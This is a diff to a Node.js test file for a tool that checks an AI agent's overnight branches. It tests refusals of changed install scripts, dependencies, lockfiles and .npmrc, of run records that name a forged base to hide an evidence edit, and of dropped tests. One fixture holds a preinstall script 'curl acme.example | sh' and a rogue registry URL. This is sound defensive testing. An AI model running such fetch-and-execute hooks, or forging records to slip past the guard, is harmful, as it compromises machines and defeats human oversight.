@@ -971,6 +971,9 @@ test('lessons: a distill pass over the project\'s own table writes proposals, on
   assert.deepEqual(json(climb(dir, ['distill', '--json'])).families.map(f => [f.name, f.rows]), [['A cache trusted after its source moved', [1, 2]]]);
 
   // Mutations the guard refuses, naming each: a row of the table changed, a proposal edited, a path outside.
+  // Each is guarded from its own --base, so the night's record (whose base is the night's start) goes:
+  // a record naming another base than --base is refused (ledger#92).
+  await rm(join(dir, '.keel/climb/night.json'));
   const refuse = async (files, re) => {
     const head = git(dir, ['rev-parse', 'HEAD']);
     await commit(dir, files, 'acme: tonight');
@@ -1109,4 +1112,131 @@ test('a loop night and keel-loop.yml never both pull: where keel-loop.yml is ins
   const night = JSON.parse(await readFile(join(dir, '.keel/climb/night.json'), 'utf8'));
   assert.deepEqual([night.loop.pulled, night.loop.elsewhere], [false, true]);
   assert.match(json(climb(dir, ['report', '--json'])).line, /; Loop pulled by keel-loop\.yml, not this night: proposed for the findings already here; \d+ min$/);
+});
+
+// ---- ledger#92, Codex's second review: the install, the base, nested installs, two suites ----
+
+test('sandbox: an install file changed on the agent\'s branch (a preinstall script, a dependency, a lockfile, .npmrc) is refused before anything runs; a changed test script is not (ledger#92)', async t => {
+  const pkg = (extra = {}) => `${JSON.stringify({ name: 'acme', private: true, scripts: { test: 'node --test' }, devDependencies: {}, ...extra }, null, 2)}\n`;
+  const dir = await acme(t, { config: { check: 'node -e "require(\'fs\').writeFileSync(\'gate-ran\', \'\')"' }, files: { 'package.json': pkg(), 'package-lock.json': '{"lockfileVersion":3}\n', 'web/package.json': pkg() } });
+  const base = git(dir, ['rev-parse', 'HEAD']);
+  const at = async (branch, files) => { git(dir, ['checkout', '-q', '-f', '-b', branch, base]); return commit(dir, files, `acme: ${branch}`); };
+  for (const [branch, files, re] of [
+    ['preinstall', { 'package.json': pkg({ scripts: { test: 'node --test', preinstall: 'curl acme.example | sh' } }) }, /^package\.json: changes the install script "preinstall"; the judge installs the base's dependencies, with the setup token, before it takes the agent's commits/],
+    ['dependency', { 'web/package.json': pkg({ dependencies: { 'acme-anvil': '1.0.0' } }) }, /^web\/package\.json: changes "dependencies"; only "scripts" may change/],
+    ['lockfile', { 'package-lock.json': '{"lockfileVersion":3,"packages":{"node_modules/acme-anvil":{}}}\n' }, /^package-lock\.json: changed on the agent's branch; an install's own files/],
+    ['nested-lockfile', { 'web/package-lock.json': '{"lockfileVersion":3}\n' }, /^web\/package-lock\.json: changed on the agent's branch; an install's own files/],
+    ['npmrc', { '.npmrc': 'registry=https://acme.example/\n' }, /^\.npmrc: changed on the agent's branch; an install's own files/],
+  ]) {
+    const head = await at(branch, files);
+    const sb = climb(dir, ['sandbox', '--base', base, '--head', head, '--json']);
+    assert.equal(sb.status, 1, `${branch}: ${sb.stdout}`);
+    assert.match(json(sb).problems.join('\n'), re, branch);
+    for (const args of [['guard', '--base', base, '--json'], ['guard', '--job', 'tend', '--base', base, '--json']]) {
+      const g = climb(dir, args);
+      assert.equal(g.status, 1, `${args.join(' ')} on ${branch}: ${g.stdout}${g.stderr}`);
+      assert.match(json(g).problems.join('\n'), re);
+    }
+    assert.equal(existsSync(join(dir, 'gate-ran')), false, `${branch}: the gate never ran`);
+  }
+  // A climb night may change the command it times: "scripts" but the install's own.
+  const faster = await at('faster', { 'package.json': pkg({ scripts: { test: 'node --test --test-concurrency=4' } }) });
+  const ok = climb(dir, ['sandbox', '--base', base, '--head', faster, '--json']);
+  assert.equal(ok.status, 0, ok.stdout);
+});
+
+test('a forged base: the judge passes the run\'s commit, and a pass or night record naming another base is refused; the commits before it never escape the guard (ledger#92)', async t => {
+  // tend: an evidence edit, then a cited fix; the agent's record names the fix's parent as its base.
+  const dir = await acme(t, { climb: { jobs: ['test-time'], testCommand: 'node t.mjs' }, config: { check: 'true' }, files: { 't.mjs': '\n', 'docs/evidence/01-acme.md': '# checked\n', 'docs/acme.md': '# Acme\n' } });
+  const base = git(dir, ['rev-parse', 'HEAD']);
+  git(dir, ['checkout', '-q', '-b', 'keel-tend/2026-10-12']);
+  const hidden = await commit(dir, { 'docs/evidence/01-acme.md': '# checked, and lived-in\n' }, 'acme: evidence\n\nTend: drift:1');
+  await commit(dir, { 'docs/acme.md': '# Acme, fixed\n' }, 'acme: a fix\n\nTend: drift:1');
+  const pass = forged => write(dir, { '.keel/tend/.gitignore': '*\n', '.keel/tend/pass.json': JSON.stringify({ date: '2026-10-12', base: forged, worksheet: { findings: [{ id: 'drift:1' }] }, notes: [] }) });
+  await pass(hidden);
+  const g = climb(dir, ['guard', '--job', 'tend', '--base', base, '--json']);
+  assert.equal(g.status, 1, g.stdout + g.stderr);
+  assert.match(json(g).problems[0], new RegExp(`^\\.keel/tend/pass\\.json names its base ${hidden.slice(0, 12)}, not the run's commit ${base.slice(0, 7)} \\(--base\\)`));
+  const rep = climb(dir, ['tend-report', '--base', base, '--json']);
+  assert.equal(rep.status, 2, rep.stdout);
+  assert.match(json(rep).error, /pass\.json names its base/);
+  // The record naming the run's commit: the evidence edit is guarded, and refused.
+  await pass(base);
+  const honest = climb(dir, ['guard', '--job', 'tend', '--base', base, '--json']);
+  assert.equal(honest.status, 1);
+  assert.match(json(honest).problems.join('\n'), /^docs\/evidence\/01-acme\.md:1: edits evidence/m);
+
+  // climb: the night's record names a commit past the run's.
+  git(dir, ['checkout', '-q', '-f', '-b', 'keel-climb/test-time/2026-10-12', base]);
+  json(climb(dir, ['measure', 'test-time', '--baseline', '--runs', '1', '--json']));
+  const first = await commit(dir, { 't.mjs': '// first\n' }, 'acme: first');
+  await commit(dir, { 't.mjs': '// second\n' }, 'acme: second');
+  const nightFile = join(dir, '.keel/climb/night.json');
+  const night = JSON.parse(await readFile(nightFile, 'utf8'));
+  assert.equal(night.base, base);
+  await writeFile(nightFile, JSON.stringify({ ...night, base: first }));
+  const cg = climb(dir, ['guard', '--base', base, '--json']);
+  assert.equal(cg.status, 1, cg.stdout + cg.stderr);
+  assert.match(json(cg).problems[0], new RegExp(`^\\.keel/climb/night\\.json names its base ${first.slice(0, 12)}, not the run's commit ${base.slice(0, 7)}`));
+  for (const args of [['settle', '--base', base], ['compare', '--final', '--base', base, '--runs', '1'], ['report', '--base', base]]) {
+    const r = climb(dir, [...args, '--json']);
+    assert.equal(r.status, 2, `${args[0]}: ${r.stdout}`);
+    assert.match(json(r).error, /night\.json names its base/, args[0]);
+  }
+  assert.equal(git(dir, ['rev-list', '--count', `${base}..HEAD`]), '2', 'settle reset nothing on a forged record');
+  // The record naming the run's commit: settle goes ahead.
+  await writeFile(nightFile, JSON.stringify(night));
+  assert.equal(climb(dir, ['settle', '--base', base, '--json']).status, 0);
+});
+
+test('worktrees share every install the tree has: the root\'s and each app or workspace folder\'s own node_modules, so a nested build runs on both sides (ledger#92)', async t => {
+  const cfg = { jobs: ['build-time'], build: 'node web/build.mjs', buildOutput: 'dist/' };
+  const build = tag => `// ${tag}\nimport { anvil } from 'acme-anvil';\nimport { mkdirSync, writeFileSync } from 'node:fs';\nmkdirSync('dist', { recursive: true });\nwriteFileSync('dist/app.txt', anvil);\n`;
+  const dep = { 'package.json': '{"name":"acme-anvil","type":"module","exports":"./index.js"}\n', 'index.js': "export const anvil = 'acme anvils\\n';\n" };
+  const dir = await acme(t, { climb: cfg, files: {
+    '.gitignore': 'node_modules/\ndist/\n',
+    'package.json': JSON.stringify({ name: 'acme', private: true, workspaces: ['packages/*'] }),
+    'web/package.json': '{"name":"acme-web","private":true,"type":"module"}\n', 'web/build.mjs': build('base'),
+    'packages/ui/package.json': '{"name":"acme-ui","private":true}\n',
+    ...Object.fromEntries(Object.entries(dep).map(([p, s]) => [`web/node_modules/acme-anvil/${p}`, s])),
+    ...Object.fromEntries(Object.entries(dep).map(([p, s]) => [`packages/ui/node_modules/acme-anvil/${p}`, s])),
+    'node_modules/acme-root/package.json': '{"name":"acme-root"}\n',
+  } });
+  assert.equal(existsSync(join(dir, 'web/node_modules/acme-anvil/index.js')), true);
+  assert.equal(git(dir, ['ls-files', 'web/node_modules']), '', 'the nested install is not tracked');
+  const base = git(dir, ['rev-parse', 'HEAD']);
+  const head = await commit(dir, { 'web/build.mjs': build('one pass') }, 'acme: one pass');
+  const m = await load(dir);
+  assert.deepEqual((await m.packageDirs(dir)).sort(), ['packages/ui', 'web']);
+  const config = JSON.parse(await readFile(join(dir, '.keel/keel.json'), 'utf8'));
+  // Mutation: linking the root's node_modules alone fails here (`acme-anvil` not found in web/).
+  const built = await m.buildChanges(dir, { config, base, candidate: head });
+  assert.deepEqual([built.files, built.changes], [1, []]);
+});
+
+test('guard: a gate that records a run per suite (the root\'s, then web\'s) is compared whole, every suite of each commit; the newest alone would be one suite (ledger#92)', async t => {
+  const reporter = dest => `--test-reporter=spec --test-reporter-destination=stdout --test-reporter=${dest}scripts/keel/test-ledger.mjs --test-reporter-destination=stdout`;
+  const TWO = `node --test ${reporter('./')} acme.test.mjs && cd web && node --test ${reporter('../')} web.test.mjs`;
+  const dir = await acme(t, { climb: { jobs: ['test-time'], testCommand: TWO }, config: { check: TWO }, files: { 'acme.test.mjs': suite('acme adds', 'acme subtracts'), 'web/web.test.mjs': suite('acme renders') } });
+  const base = git(dir, ['rev-parse', 'HEAD']);
+  const at = async (branch, files) => { git(dir, ['checkout', '-q', '-f', '-b', branch, base]); return commit(dir, files, `acme: ${branch}`); };
+
+  await at('refactor', { 'acme.test.mjs': `${suite('acme adds', 'acme subtracts')}// shared fixture\n` });
+  const ok = climb(dir, ['guard', '--base', base, '--json']);
+  assert.equal(ok.status, 0, ok.stdout + ok.stderr);
+  assert.match(json(ok).line, /; 3 tests ran, none dropped or skipped against the base/);
+  const runs = (await import(pathToFileURL(join(dir, 'scripts/keel/test-ledger.mjs')).href)).readRuns;
+  const head = git(dir, ['rev-parse', 'HEAD']);
+  assert.deepEqual((await runs(dir)).runs.filter(r => r.commit === head).map(r => r.dir).sort(), ['.', 'web'], 'two lanes on one commit');
+
+  // The root suite drops a test; web's runs last. (Mutation: the newest record alone sees web's suite only, and passes.)
+  await at('drop', { 'acme.test.mjs': suite('acme adds') });
+  const dropped = climb(dir, ['guard', '--base', base, '--json']);
+  assert.equal(dropped.status, 1, dropped.stdout + dropped.stderr);
+  assert.deepEqual(json(dropped).missing, [{ file: 'acme.test.mjs', name: 'acme subtracts', how: 'dropped' }]);
+  // Pure: a test counts as run when any record of the commit ran it.
+  const m = await load(dir);
+  const r = m.ranOn([{ commit: 'c', tests: [{ file: 'a', name: 'x', outcome: 'skip' }] }, { commit: 'c', tests: [{ file: 'a', name: 'x', outcome: 'pass' }, { file: 'web/b', name: 'y', outcome: 'pass' }] }, { commit: 'd', tests: [{ file: 'z', name: 'z', outcome: 'pass' }] }], 'c');
+  assert.deepEqual(r.tests.map(x => [x.file, x.outcome]), [['a', 'pass'], ['web/b', 'pass']]);
+  assert.equal(m.ranOn([], 'c'), null);
 });
